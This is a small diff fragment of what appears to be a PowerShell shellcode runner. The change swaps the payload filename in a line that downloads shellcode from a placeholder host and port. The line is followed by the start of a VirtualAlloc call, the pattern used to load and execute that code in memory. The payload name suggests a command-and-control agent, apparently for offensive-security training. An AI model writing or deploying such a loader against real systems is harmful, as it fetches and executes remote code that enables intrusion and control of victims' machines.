@@ -36,7 +36,7 @@ function getDelegateType {
 }
 
 # Download shellcode
-$Shellcode = (New-Object System.Net.WebClient).DownloadData("<URL>:<PORT>/apollo-local.bin")
+$Shellcode = (New-Object System.Net.WebClient).DownloadData("<URL>:<PORT>/apollo-osep.bin")
 
 # VirtualAlloc
 $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
